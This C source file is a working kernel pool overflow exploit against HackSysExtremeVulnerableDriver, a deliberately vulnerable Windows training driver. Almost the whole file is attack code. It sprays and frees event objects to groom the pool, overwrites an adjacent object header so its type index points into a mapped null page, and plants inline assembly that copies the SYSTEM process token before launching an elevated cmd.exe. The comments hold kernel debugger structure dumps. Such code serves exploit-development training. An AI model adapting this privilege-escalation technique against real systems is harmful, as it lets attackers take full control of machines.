#include <windows.h>
#include <stdio.h>
typedef NTSTATUS
(WINAPI* My_NtAllocateVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect
	);

My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
static VOID ShellCode()
{
	_asm
	{
		//int 3
		pop edi
		pop esi
		pop ebx
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
		mov eax, [eax + 0xb8]	// Find the process activity list
		sub eax, 0xb8    		// List traversal
		cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
		jnz find_sys_pid

		// Replace the Token
		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		//int 3
		ret
	}
}
int main() {
	HANDLE spray_event[0x10000];
	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	DWORD dwBytesOut = 0;
	int PoolSize = 0x1f8;
	char buf[0x500]{};
	memset(buf, 0x41, PoolSize);
	*(DWORD*)(buf + PoolSize + 0x00) = 0x04080040;
	*(DWORD*)(buf + PoolSize + 0x04) = 0xee657645;
	/**8c145180 size : 200 previous size : 40  (Allocated)*Hack
		Owning component : Unknown(update pooltag.txt)
		8c145380 size : 40 previous size : 200  (Allocated)Even(Protected)*/

	/*kd > dt nt!_POOL_HEADER 8c145380  // 8c145380是事件对象地址
		+ 0x000 PreviousSize     : 0y001000000(0x40)
		+ 0x000 PoolIndex : 0y0000000(0)
		+ 0x002 BlockSize : 0y000001000(0x8)
		+ 0x002 PoolType : 0y0000010(0x2)
		+ 0x000 Ulong1 : 0x4080040
		+ 0x004 PoolTag : 0xee657645
		+ 0x004 AllocatorBackTraceIndex : 0x7645
		+ 0x006 PoolTagHash : 0xee65*/

	*(DWORD*)(buf + PoolSize + 0x08) = 0x00000000;
	*(DWORD*)(buf + PoolSize + 0x0c) = 0x00000040;
	*(DWORD*)(buf + PoolSize + 0x10) = 0x00000000;
	*(DWORD*)(buf + PoolSize + 0x14) = 0x00000000;
	//kd > dt nt!_OBJECT_HEADER_QUOTA_INFO 8c145380 + 8
	//	+ 0x000 PagedPoolCharge  : 0
	//	+ 0x004 NonPagedPoolCharge : 0x40
	//	+ 0x008 SecurityDescriptorCharge : 0
	//	+ 0x00c SecurityDescriptorQuotaBlock : (null)
	*(DWORD*)(buf + PoolSize + 0x18) = 0x00000001;
	*(DWORD*)(buf + PoolSize + 0x1c) = 0x00000001;
	*(DWORD*)(buf + PoolSize + 0x20) = 0x00000000;
	*(DWORD*)(buf + PoolSize + 0x24) = 0x00080000;//TypeIndex=0
	/*kd > dt nt!_OBJECT_HEADER 8c145380 + 18
		+ 0x000 PointerCount     : 0n1
		+ 0x004 HandleCount : 0n1
		+ 0x004 NextToFree : 0x00000001 Void
		+ 0x008 Lock : _EX_PUSH_LOCK
		+ 0x00c TypeIndex : 0xc ''
		+ 0x00d TraceFlags : 0 ''
		+ 0x00e InfoMask : 0x8 ''
		+ 0x00f Flags : 0 ''
		+ 0x010 ObjectCreateInfo : 0x8d187640 _OBJECT_CREATE_INFORMATION
		+ 0x010 QuotaBlockCharged : 0x8d187640 Void
		+ 0x014 SecurityDescriptor : (null)
		+0x018 Body : _QUAD*/

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		return(-1);
	}
	ULONG dw;
	for (int i = 0; i < 0x10000; i++)
		spray_event[i] = CreateEvent(NULL, FALSE, FALSE, TEXT(""));
	for (int i = 0; i < 0x10000; i += 0x10) {
		for (int j = 0; j < 8; j++)
		{
			// 0x40 * 8 = 0x200
			HANDLE temp = spray_event[i + j];
			CloseHandle(temp);
		}
	}
	PVOID	Zero_addr = (PVOID)1;
	SIZE_T	RegionSize = 0x1000;

	*(FARPROC*)&NtAllocateVirtualMemory = GetProcAddress(
		GetModuleHandleW(L"ntdll"),
		"NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL)
	{
		printf("[+]Failed to get function NtAllocateVirtualMemory!!!\n");
		system("pause");
		return 0;
	}

	NtAllocateVirtualMemory(
		INVALID_HANDLE_VALUE,
		&Zero_addr,
		0,
		&RegionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	*(DWORD*)(0x60) = (DWORD)&ShellCode;//OBJECT_TYPE_INITIALIZER
										//+0x038 CloseProcedure:(null)
	DeviceIoControl(hDriver, 0x22200F, buf, 0x1f8+0x28, 0, 0, &dw, NULL);
	for (int i = 0; i < 0x10000; i++)
	{
		if (spray_event[i]) CloseHandle(spray_event[i]);
	}
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	DebugBreak();
	return 0;
}
